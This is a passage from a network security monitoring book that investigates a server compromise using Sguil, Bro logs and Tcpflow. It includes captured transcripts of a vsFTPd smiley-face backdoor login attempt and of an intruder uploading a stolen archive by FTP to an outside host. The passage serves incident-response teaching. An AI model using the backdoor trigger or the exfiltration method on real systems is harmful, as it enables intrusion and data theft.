- en: those passwords, he can access the system directly, rather than needing to
  prefs: []
  type: TYPE_NORMAL
- en: break into it using an exploit.
  prefs: []
  type: TYPE_NORMAL
- en: We now understand a good deal about this case, but is that the end of
  prefs: []
  type: TYPE_NORMAL
- en: the story?
  prefs: []
  type: TYPE_NORMAL
- en: '***What Else Did the Intruder Do?***'
  prefs: []
  type: TYPE_NORMAL
- en: In order to determine a bit more about what happened, we need to take
  prefs: []
  type: TYPE_NORMAL
- en: a closer look at two other aspects of this case. First, notice in Figure 10-8
  prefs: []
  type: TYPE_NORMAL
- en: that 192.168.3.5 wasn’t the only target of 203.0.113.10\. We also see activity
  prefs: []
  type: TYPE_NORMAL
- en: '**222** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: involving ports 21 and 6200 TCP to 192.168.3.13\. We generate a transcript for
    port 21 TCP to see what happened to 192.168.3.13\. Listing 10-10 shows
  prefs: []
  type: TYPE_NORMAL
- en: the result.
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-09 21:46:37'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1_1362865597000002352'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 203.0.113.10 (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 192.168.3.13x (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 49220'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 21v'
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 203.0.113.10:49220 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]
    (up: 2 hrs) OS Fingerprint: -> 192.168.3.13:21 (link: ethernet/modem)'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 220 (vsFTPd 2.3.5)w'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: USER 1dxF:)u'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 331 Please specify the password.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: PASS 0ibjZ'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 530 Login incorrect.y'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 500 OOPS:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: vsf_sysutil_recv_peek: no data'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-10: Transcript of FTP connection from 203.0.113.10 to 192.168.3.13*'
  prefs: []
  type: TYPE_NORMAL
- en: We can see that the intruder tried the same smiley face attack u against
  prefs: []
  type: TYPE_NORMAL
- en: an FTP server v and w on 192.168.3.13 x, but that he received a rude Login
  prefs: []
  type: TYPE_NORMAL
- en: incorrect error y in return. The attack failed. Furthermore, according to
  prefs: []
  type: TYPE_NORMAL
- en: the NSM session data, no connections were made to port 6200 TCP on
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13, which tells us that 192.168.3.13 was not affected by this attack.
  prefs: []
  type: TYPE_NORMAL
- en: Now we must determine what else may have happened to 192.168.3.5\.
  prefs: []
  type: TYPE_NORMAL
- en: We saw the intruder connect to the FTP server and interact with a back-
  prefs: []
  type: TYPE_NORMAL
- en: door. Did he do anything beyond that? To answer this question, we run a
  prefs: []
  type: TYPE_NORMAL
- en: new session data query for all sessions involving the victim 192.168.3.5, as
  prefs: []
  type: TYPE_NORMAL
- en: shown in Listing 10-11\. The results are shown in Figure 10-11\.
  prefs: []
  type: TYPE_NORMAL
- en: WHERE sancp.start_time > '2013-03-09' AND sancp.src_ip = INET_
  prefs: []
  type: TYPE_NORMAL
- en: ATON('192.168.3.5') AND dst_port!=137 AND dst_port!=138
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-11: Search syntax for session data involving 192.168.3.5*'
  prefs: []
  type: TYPE_NORMAL
- en: When running this query, I added commands to ignore ports 137 and
  prefs: []
  type: TYPE_NORMAL
- en: 138 because when I first reviewed the data, I saw many irrelevant session
  prefs: []
  type: TYPE_NORMAL
- en: records for these Windows services. Because they are not germane to this
  prefs: []
  type: TYPE_NORMAL
- en: incident, I’ve removed them from the output shown in Figure 10-11\.
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **223**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 131](index-258_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 10-11: Session data for 192.168.3.5*'
  prefs: []
  type: TYPE_NORMAL
- en: We’ve seen some of this activity in earlier results, but our focus here
  prefs: []
  type: TYPE_NORMAL
- en: is 192.168.3.5, not 203.0.113.10\. The most interesting new records involve
  prefs: []
  type: TYPE_NORMAL
- en: 'two new IP addresses in the 203.0.113.0/24 net block: 203.0.113.77 and'
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.4\. These two IP addresses appear in the session records begin-
  prefs: []
  type: TYPE_NORMAL
- en: ning at 2013-03-10 01:59:43\. Apparently, our original intruder is either
  prefs: []
  type: TYPE_NORMAL
- en: cooperating with colleagues or he controls those systems!
  prefs: []
  type: TYPE_NORMAL
- en: I recommend creating at least notional diagrams of systems involved in
  prefs: []
  type: TYPE_NORMAL
- en: NSM when trying to understand the scope of an incident. You will not iden-
  prefs: []
  type: TYPE_NORMAL
- en: tify all of the infrastructure between victim systems and remote attackers,
  prefs: []
  type: TYPE_NORMAL
- en: but depicting them visually can help you better recognize what is happening
  prefs: []
  type: TYPE_NORMAL
- en: in real-world cases. Figure 10-12 summarizes our current understanding of
  prefs: []
  type: TYPE_NORMAL
- en: all of the systems involved in this case.
  prefs: []
  type: TYPE_NORMAL
- en: '**exploring the Session data**'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s consider the new sessions unearthed by querying the victim IP address
  prefs: []
  type: TYPE_NORMAL
- en: 'to determine the scope of the incident, bearing in mind this simple rule:'
  prefs: []
  type: TYPE_NORMAL
- en: The only constant in an intrusion is the victim. Intruders may try to obfus-
  prefs: []
  type: TYPE_NORMAL
- en: cate their activities by changing attacking systems, hopping from attacking
  prefs: []
  type: TYPE_NORMAL
- en: platform to attacking platform; incident responders who fixate on attacker
  prefs: []
  type: TYPE_NORMAL
- en: IP addresses will miss these jumps. Keep the victim in mind, and you won’t
  prefs: []
  type: TYPE_NORMAL
- en: be fooled.
  prefs: []
  type: TYPE_NORMAL
- en: '**224** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: Internet
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 3
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.4
  prefs: []
  type: TYPE_NORMAL
- en: Test
  prefs: []
  type: TYPE_NORMAL
- en: Network
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  prefs: []
  type: TYPE_NORMAL
- en: Server
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: Desktop
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-12: Systems observed in this case*'
  prefs: []
  type: TYPE_NORMAL
- en: Notice in Figure 10-11 that we start with the three DNS queries made
  prefs: []
  type: TYPE_NORMAL
- en: by 192.168.3.5 beginning with 2013-03-09 21:40:35\. We could use the Sguil
  prefs: []
  type: TYPE_NORMAL
- en: console to try to generate Wireshark output for each session in order to see
  prefs: []
  type: TYPE_NORMAL
- en: the queries and replies, but instead, we’ll refer to DNS logs captured by Bro,
  prefs: []
  type: TYPE_NORMAL
- en: stored in the */nsm/bro/logs/2013-03-09* directory. As you’ll see, the Bro logs
    are a form of transaction data and metadata.
  prefs: []
  type: TYPE_NORMAL
- en: '***Searching Bro DNS Logs***'
  prefs: []
  type: TYPE_NORMAL
- en: There are many ways to search Bro DNS logs for specific entries. One simple
  prefs: []
  type: TYPE_NORMAL
- en: way is from the command line, as shown in Listing 10-12\.
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | bro-cut -d | grep 192.168.3.5 |**
  prefs: []
  type: TYPE_NORMAL
- en: '**grep -v WORKGROUP**'
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-09T21:40:35+0000 k3hPbe4s2H2 192.168.3.5u 60307
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.1 53 udp 40264 2.3.168.192.in-addr.arpaw 1
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 12 PTRv - - F F T F
  prefs: []
  type: TYPE_NORMAL
- en: 0 --
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-09T21:47:08+0000 i1zTu4rfvvk 192.168.3.5x 36911
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.1 53 udp 62798 www.google.comz 1
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 1 A - - F F T F
  prefs: []
  type: TYPE_NORMAL
- en: 0 - -
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-09T21:47:18+0000 H5Wjg7kx02d 192.168.3.5y 49467
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.1 53 udp 32005 www.google.com.localdomain{ 1
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 1 A - - F F T F
  prefs: []
  type: TYPE_NORMAL
- en: 0 --
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-12: DNS records logged by Bro*'
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **225**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: First, we use zcat, because the Bro log is *gzip*-compressed. Next, we pipe
    the result into bro-cut with the -d switch, which converts Bro’s native Unix
  prefs: []
  type: TYPE_NORMAL
- en: epoch time format into a human-readable version. We then grep for the IP
  prefs: []
  type: TYPE_NORMAL
- en: address of the victim, 192.168.3.5, followed by a grep to ignore (using the
    -v
  prefs: []
  type: TYPE_NORMAL
- en: switch) any records containing WORKGROUP. Bro’s log contains DNS queries and
  prefs: []
  type: TYPE_NORMAL
- en: replies, as well as logs of NetBIOS name service traffic, which we remove
  prefs: []
  type: TYPE_NORMAL
- en: with bro-cut -d. By default, that syntax omits the headers for these records.
  prefs: []
  type: TYPE_NORMAL
- en: As you can see in Listing 10-12, 192.168.3.5 u queried for a PTR record v
  prefs: []
  type: TYPE_NORMAL
- en: for *2.3.168.192.in-addr.arpa* w, which is probably not related to the intrusion.
  prefs: []
  type: TYPE_NORMAL
- en: Then seven minutes later, the system x y queried for *www.google.com* z and
  prefs: []
  type: TYPE_NORMAL
- en: '*www.google.com.localdomain* {. These last two DNS queries correspond to'
  prefs: []
  type: TYPE_NORMAL
- en: the intruder’s attempt to ping *www.google.com*. Seeing the header in Bro logs
  prefs: []
  type: TYPE_NORMAL
- en: can help us better understand them. One way to see header data is to avoid
  prefs: []
  type: TYPE_NORMAL
- en: piping the output through bro-cut. Instead, limit the output using the head
  prefs: []
  type: TYPE_NORMAL
- en: command, as shown in Listing 10-13\.
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | head**
  prefs: []
  type: TYPE_NORMAL
- en: '#separator \x09'
  prefs: []
  type: TYPE_NORMAL
- en: '#set_separator ,'
  prefs: []
  type: TYPE_NORMAL
- en: '#empty_field (empty)'
  prefs: []
  type: TYPE_NORMAL
- en: '#unset_field -'
  prefs: []
  type: TYPE_NORMAL
- en: '#path dns'
  prefs: []
  type: TYPE_NORMAL
- en: '#open 2013-03-09-21-31-10'
  prefs: []
  type: TYPE_NORMAL
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  prefs: []
  type: TYPE_NORMAL
- en: id.resp_p proto trans_id query qclass qclass_name qtype
  prefs: []
  type: TYPE_NORMAL
- en: qtype_name rcode rcode_name AA TC RD RA Z
  prefs: []
  type: TYPE_NORMAL
- en: answers TTLs
  prefs: []
  type: TYPE_NORMAL
- en: '#types time string addr port addr port enum count string'
  prefs: []
  type: TYPE_NORMAL
- en: count string count string count string bool bool bool bool
  prefs: []
  type: TYPE_NORMAL
- en: count vector[string] vector[interval]
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-13: Fields and datatypes in the Bro DNS log*'
  prefs: []
  type: TYPE_NORMAL
- en: '***Searching Bro SSH Logs***'
  prefs: []
  type: TYPE_NORMAL
- en: Following the three DNS entries, Figure 10-11 shows 203.0.113.77 pinging
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5 via IP protocol 0, ICMP. This is the first traffic we’ve seen from
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77\.
  prefs: []
  type: TYPE_NORMAL
- en: The next record shows traffic from 203.0.113.77 to port 22 TCP on
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5\. This is likely SSH traffic, which we can confirm by looking at
    full
  prefs: []
  type: TYPE_NORMAL
- en: content data or by checking a few Bro logs. For example, in the *2013-03-10*
  prefs: []
  type: TYPE_NORMAL
- en: directory, we see the entry shown in Listing 10-14 in *ssh.log*. (Note that
    in
  prefs: []
  type: TYPE_NORMAL
- en: order to see the headers for the fields, we omit using bro-cut, as we did for
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-13.) The listing shows the entire log since it contains only one
  prefs: []
  type: TYPE_NORMAL
- en: entry of interest.
  prefs: []
  type: TYPE_NORMAL
- en: '**226** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz | bro-cut -d**
  prefs: []
  type: TYPE_NORMAL
- en: 2013-03-10T02:01:10+0000 8zAB2nsjjYd 203.0.113.77u 65438
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5v 22 success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
  prefs: []
  type: TYPE_NORMAL
- en: FreeBSD-20110503 SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 16678 AU
  prefs: []
  type: TYPE_NORMAL
- en: '- - - -'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-14: SSH connection logged by Bro*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-14 shows 203.0.113.77 u connected via SSH to 192.168.3.5 v.
  prefs: []
  type: TYPE_NORMAL
- en: To understand the rest of the fields, we need to know the headers for the
  prefs: []
  type: TYPE_NORMAL
- en: logfile. Listing 10-15 shows the headers in a Bro SSH log followed by the
  prefs: []
  type: TYPE_NORMAL
- en: same SSH record for 203.0.113.77 connecting to 192.168.3.5\.
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz**
  prefs: []
  type: TYPE_NORMAL
- en: '#separator \x09'
  prefs: []
  type: TYPE_NORMAL
- en: '#set_separator ,'
  prefs: []
  type: TYPE_NORMAL
- en: '#empty_field (empty)'
  prefs: []
  type: TYPE_NORMAL
- en: '#unset_field -'
  prefs: []
  type: TYPE_NORMAL
- en: '#path ssh'
  prefs: []
  type: TYPE_NORMAL
- en: '#open 2013-03-10-02-03-29'
  prefs: []
  type: TYPE_NORMAL
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  prefs: []
  type: TYPE_NORMAL
- en: id.resp_p status direction client server resp_size
  prefs: []
  type: TYPE_NORMAL
- en: remote_location.country_code remote_location.region remote_location.city
  prefs: []
  type: TYPE_NORMAL
- en: remote_location.latitude remote_location.longitude
  prefs: []
  type: TYPE_NORMAL
- en: '#types time string addr port addr port string enum string'
  prefs: []
  type: TYPE_NORMAL
- en: string count string string string double double
  prefs: []
  type: TYPE_NORMAL
- en: 1362880870.544761 8zAB2nsjjYd 203.0.113.77 65438
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5 22 success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
  prefs: []
  type: TYPE_NORMAL
- en: FreeBSD-20110503u SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1v 16678 AU
  prefs: []
  type: TYPE_NORMAL
- en: '- - - -'
  prefs: []
  type: TYPE_NORMAL
- en: '#close 2013-03-10-03-00-00'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-15: SSH connection logged by Bro, with headers*'
  prefs: []
  type: TYPE_NORMAL
- en: The client and server fields are the most interesting. The client is listed
  prefs: []
  type: TYPE_NORMAL
- en: as SSH-2.0-OpenSSH_5.8p2_hpn13v11 FreeBSD-20110503 u, and the server is
  prefs: []
  type: TYPE_NORMAL
- en: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 v. While you can easily identify the
  prefs: []
  type: TYPE_NORMAL
- en: server version of SSH because you own the system, the information that the
  prefs: []
  type: TYPE_NORMAL
- en: client (the intruder) runs FreeBSD may be interesting. Knowing the exact
  prefs: []
  type: TYPE_NORMAL
- en: version of OpenSSH on the client (again, the intruder) may also help you to
  prefs: []
  type: TYPE_NORMAL
- en: attribute the attack or to correlate it with other incident data.
  prefs: []
  type: TYPE_NORMAL
- en: Unfortunately, the contents of the SSH session are encrypted, meaning
  prefs: []
  type: TYPE_NORMAL
- en: that you can’t decipher them using network-centric means. If the system
  prefs: []
  type: TYPE_NORMAL
- en: had a host-centric tool like OSSEC installed, you might have had data avail-
  prefs: []
  type: TYPE_NORMAL
- en: able from the local system for inspection, but the session records show the
  prefs: []
  type: TYPE_NORMAL
- en: SSH session beginning at 2013-03-10 02:01:10 and terminating at 02:03:24\.
  prefs: []
  type: TYPE_NORMAL
- en: Can we tell what the intruder did in this encrypted session? The last few ses-
  prefs: []
  type: TYPE_NORMAL
- en: sion records help answer that question.
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **227**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Searching Bro FTP Logs***'
  prefs: []
  type: TYPE_NORMAL
- en: At 2013-03-10 02:02:50 in Figure 10-11, we see an outbound FTP session
  prefs: []
  type: TYPE_NORMAL
- en: from 192.168.3.5 to 203.0.113.4\. If this is truly an FTP session, we should
    be
  prefs: []
  type: TYPE_NORMAL
- en: able to build a transcript to see the contents. We can also quickly check the
  prefs: []
  type: TYPE_NORMAL
- en: Bro FTP log, as shown in Listing 10-16\.
  prefs: []
  type: TYPE_NORMAL
- en: $ **zcat ftp.02\:03\:11-03\:00\:00.log.gz**
  prefs: []
  type: TYPE_NORMAL
- en: '#separator \x09'
  prefs: []
  type: TYPE_NORMAL
- en: '#set_separator ,'
  prefs: []
  type: TYPE_NORMAL
- en: '#empty_field (empty)'
  prefs: []
  type: TYPE_NORMAL
- en: '#unset_field -'
  prefs: []
  type: TYPE_NORMAL
- en: '#path ftpv'
  prefs: []
  type: TYPE_NORMAL
- en: '#open 2013-03-10-02-03-11'
  prefs: []
  type: TYPE_NORMAL
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  prefs: []
  type: TYPE_NORMAL
- en: id.resp_p user password command arg mime_type mime_
  prefs: []
  type: TYPE_NORMAL
- en: desc file_size reply_code reply_msg tags
  prefs: []
  type: TYPE_NORMAL
- en: extraction_file
  prefs: []
  type: TYPE_NORMAL
- en: '#types time string addr port addr port string string string'
  prefs: []
  type: TYPE_NORMAL
- en: string string string count count string table[string] file
  prefs: []
  type: TYPE_NORMAL
- en: 1362880986.113638 FVmgKldpQO5 192.168.3.5w 32904
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.4x 21 orr <hidden> STOR ftp://203.0.113.4/./
  prefs: []
  type: TYPE_NORMAL
- en: mysql-ssl.tar.gzu application/x-gzip gzip compressed data, from
  prefs: []
  type: TYPE_NORMAL
- en: FAT filesystem (MS-DOS, OS/2, NT) - 226 Transfer complete.
  prefs: []
  type: TYPE_NORMAL
- en: '- -'
  prefs: []
  type: TYPE_NORMAL
- en: '#close 2013-03-10-03-00-00'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-16: Bro FTP log*'
  prefs: []
  type: TYPE_NORMAL
- en: Here, we see that someone successfully transferred a file titled
  prefs: []
  type: TYPE_NORMAL
- en: '*mysql-ssl.tar.gz* u via FTP v from 192.168.3.5 w to 203.0.113.4 x. The'
  prefs: []
  type: TYPE_NORMAL
- en: transcript shows a little more information, as shown in Listing 10-17\.
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-10 02:02:50'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1_1362880970000002980'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 192.168.3.5 (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 203.0.113.4 (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 32904'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 21'
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 192.168.3.5:32904 - Linux 2.6 (newer, 1) (up: 5 hrs)'
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: -> 203.0.113.4:21 (distance 0, link: ethernet/modem)'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 220 freebsdvmw FTP server (Version 6.00LS) ready.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: USER orrv'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 331 Password required for orr.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: PASS bobbyu'
  prefs: []
  type: TYPE_NORMAL
- en: '**228** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 230 User orr logged in.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: SYST'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 215 UNIX Type: L8 Version: BSD-199506x'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: TYPE I'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 200 Type set to I.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: PORT 192,168,3,5,128,244'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 200 PORT command successful.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: STOR mysql-ssl.tar.gz'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 150 Opening BINARY mode data connection for ''mysql-ssl.tar.gz''.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-17: Transcript of intruder FTP command channel to 203.0.113.4*'
  prefs: []
  type: TYPE_NORMAL
- en: I like this guy. His password is bobby u, and his username is orr v. This
  prefs: []
  type: TYPE_NORMAL
- en: FTP server is running on a system that identifies itself as freebsdvm w, with
  prefs: []
  type: TYPE_NORMAL
- en: 'UNIX Type L8 Version: BSD-199506 x. Again, we could use this information to'
  prefs: []
  type: TYPE_NORMAL
- en: possibly link this case with others, if appropriate.
  prefs: []
  type: TYPE_NORMAL
- en: We don’t know what the intruder did to acquire the contents of this file.
  prefs: []
  type: TYPE_NORMAL
- en: Can we determine what’s in it?
  prefs: []
  type: TYPE_NORMAL
- en: '***Decoding the Theft of Sensitive Data***'
  prefs: []
  type: TYPE_NORMAL
- en: In fact, we can retrieve the *mysql-ssl.tar.gz* archive by virtue of the full
    content data collection performed by our NSM platform. We’ll derive extracted
  prefs: []
  type: TYPE_NORMAL
- en: content data from full content data using the tool that Sguil uses to rebuild
  prefs: []
  type: TYPE_NORMAL
- en: transcripts, called Tcpflow ( *https://github.com/simsong/tcpflow*). Jeremy
    Elson wrote the first version of Tcpflow, but in recent years Simson Garfinkel
    has
  prefs: []
  type: TYPE_NORMAL
- en: assumed responsibility for the project.
  prefs: []
  type: TYPE_NORMAL
- en: Tcpflow reconstructs TCP sessions. For example, in Listing 10-18, we
  prefs: []
  type: TYPE_NORMAL
- en: tell Tcpflow to rebuild all TCP sessions involving port 20, the TCP port used
  prefs: []
  type: TYPE_NORMAL
- en: for the active FTP data channel shown in the session records.
  prefs: []
  type: TYPE_NORMAL
- en: $ **tcpflow -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-10/snort.log.1362873602
    port 20**u $ **ls**v
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.003.005.33012-203.000.113.004.00020w 203.000.113.004.00020-192.168.003.005.56377x
    report.xmly
  prefs: []
  type: TYPE_NORMAL
- en: $ **file ***z
  prefs: []
  type: TYPE_NORMAL
- en: '192.168.003.005.33012-203.000.113.004.00020{: gzip compressed data, from Unix,
    last modified: Sun Mar 10 02:02:23 2013'
  prefs: []
  type: TYPE_NORMAL
- en: '203.000.113.004.00020-192.168.003.005.56377|: ASCII text, with CRLF line terminators'
  prefs: []
  type: TYPE_NORMAL
- en: 'report.xml: XML document text'
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **229**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: $ **cat 203.000.113.004.00020-192.168.003.005.56377**
  prefs: []
  type: TYPE_NORMAL
- en: total 1936
  prefs: []
  type: TYPE_NORMAL
- en: drwxr-xr-x 2 orr orr 512 Mar 9 21:03 .
  prefs: []
  type: TYPE_NORMAL
- en: drwxr-xr-x 4 root wheel 512 Mar 9 20:47 ..
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 orr orr 1016 Mar 9 20:47 .cshrc
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 orr orr 254 Mar 9 20:47 .login
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 orr orr 165 Mar 9 20:47 .login_conf
  prefs: []
  type: TYPE_NORMAL
- en: -rw------- 1 orr orr 381 Mar 9 20:47 .mail_aliases
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 orr orr 338 Mar 9 20:47 .mailrc
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 orr orr 750 Mar 9 20:47 .profile
  prefs: []
  type: TYPE_NORMAL
- en: -rw------- 1 orr orr 283 Mar 9 20:47 .rhosts
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 orr orr 980 Mar 9 20:47 .shrc
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 orr orr 915349 Mar 9 21:03 mysql-ssl.tar.gz}
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-18: Tcpflow reconstruction of sessions involving port 20*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-18 first shows how to run Tcpflow against an interesting trace,
  prefs: []
  type: TYPE_NORMAL
- en: with a BPF limiting reconstruction to traffic involving port 20 u. Next, we
  prefs: []
  type: TYPE_NORMAL
- en: see the output of the Tcpflow reconstruction in the form of a directory list-
  prefs: []
  type: TYPE_NORMAL
- en: ing v. The output shows two sides of the network session, in the form of two
  prefs: []
  type: TYPE_NORMAL
- en: files, w and x, and a *report.xml* file y describing what Tcpflow did. Next,
    we use the file z command to show the type of each of those files.
  prefs: []
  type: TYPE_NORMAL
- en: '***Extracting the Stolen Archive***'
  prefs: []
  type: TYPE_NORMAL
- en: The file *192.168.003.005.33012-203.000.113.004.00020* { is a *gzip* archive
    transferred during the FTP session. The file *203.000.113.004.00020-192*
  prefs: []
  type: TYPE_NORMAL
- en: '*.168.003.005.56377* | is an ASCII text file, corresponding to a directory
    listing returned from the FTP server to the client 192.168.3.5\. This directory'
  prefs: []
  type: TYPE_NORMAL
- en: listing was transferred after the intruder copied *mysql-ssl.tar.gz* to the
    server.
  prefs: []
